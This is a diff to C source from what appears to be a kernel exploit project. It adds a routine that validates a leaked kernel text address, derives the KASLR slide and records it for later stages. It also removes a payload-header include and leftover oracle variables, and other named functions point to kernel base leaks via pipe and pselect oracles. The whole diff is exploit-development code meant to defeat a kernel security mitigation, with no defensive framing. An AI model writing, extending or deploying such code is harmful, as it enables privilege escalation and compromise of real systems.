@@ -1,9 +1,5 @@
 #include "common.h"
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#include SLIDE_PAYLOAD_HEADER
-#endif
-
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
 #endif
@@ -46,8 +42,6 @@ static atomic_int slide_consumer_ready;
 static atomic_int slide_pselect_write_window;
 static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
 static int slide_syscall_pad;
-static uintptr_t slide_oracle_parent;
-static uintptr_t slide_oracle_target;
 
 static int slide_commit_stext(uint64_t stext, const char *source);
 
@@ -540,7 +534,6 @@ uint64_t slide_read_stext(void) {
              getpid(), (unsigned long long)stext);
   return stext;
 }
-
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -939,6 +932,34 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
   return restore_ok && restored_target == original_target;
 }
 #endif
+
+static int slide_commit_stext(uint64_t stext, const char *source) {
+  if (stext < KIMAGE_TEXT_BASE) {
+    return 0;
+  }
+  uint64_t slide = stext - KIMAGE_TEXT_BASE;
+  if (slide > 0x1f0000ULL || (slide & 0xffffULL) != 0) {
+    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
+               source, (unsigned long long)stext,
+               (unsigned long long)slide);
+    return 0;
+  }
+  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
+    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
+               slide_p0_offset, (unsigned long long)slide);
+    return 0;
+  }
+  kaslr_base = stext;
+  kaslr_slide = slide;
+  slide_p0_offset = slide;
+  kaslr_done = 1;
+  app_publish_p0_offset(slide_p0_offset);
+  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
+             "slide=%016llx\n",
+             source, getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
+  return 1;
+}
 
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
